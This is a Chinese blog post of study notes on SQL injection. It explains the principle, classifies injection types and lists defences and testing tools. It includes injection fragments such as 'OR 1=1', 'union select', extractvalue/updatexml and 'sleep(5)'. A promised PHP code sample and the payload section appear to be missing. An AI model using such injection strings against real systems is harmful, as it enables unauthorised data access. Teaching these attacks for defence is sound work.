SQL 注入从入门到实战笔记

发表于 2026-08-28 更新于 2026-09-01 分类于 Web 渗透 本文字数： 584 阅读时长 ≈ 2 分钟

0x00 前言

SQL 注入长期占据 OWASP Top10 头部位置，是 Web 渗透中最经典、杀伤力最强的漏洞之一。本文梳理基础原理、常见类型与实战 Payload，作为学习笔记存档。

注：本文仅用于合法授权环境下的安全研究。

0x01 原理

后端直接将用户输入拼接到 SQL 语句中，未做过滤或参数化，导致攻击者可以改变 SQL 语义。

典型漏洞代码（PHP）：

输入 id=1 OR 1=1 后，SQL 变成 SELECT * FROM users WHERE id = 1 OR 1=1，返回全部用户。

0x02 分类

按注入点位置分：

类型 特征 示例
回显注入 结果直接返回页面 union select
报错注入 利用数据库报错带出数据 extractvalue, updatexml
盲注 无回显，靠布尔/时间判断 and sleep(5)
二次注入 数据先存入再触发 注册处存 payload

0x04 防御

  1. 参数化查询（最佳方案）：使用 PDO 预编译 / MyBatis #{} / Java PreparedStatement。
  2. 输入校验：白名单校验类型、长度。
  3. 最小权限：DB 账号只读 + 只能查指定库。
  4. WAF：作为补充防线，不能替代代码层防御。
  5. 审计：对自研 ORM 重点 review。

0x05 工具推荐

  • sqlmap：自动化注入神器，支持 6 大数据库
  • BurpSuite Intruder：手工测试 + 批量 fuzz
  • NoSQLi Scanner：NoSQL 注入场景

0x06 结语

SQL 注入虽”老”，但每年仍有大量在野漏洞。理解原理 + 多看 Payload + 多打靶场（sqli-labs、DVWA），是掌握它的唯一路径。
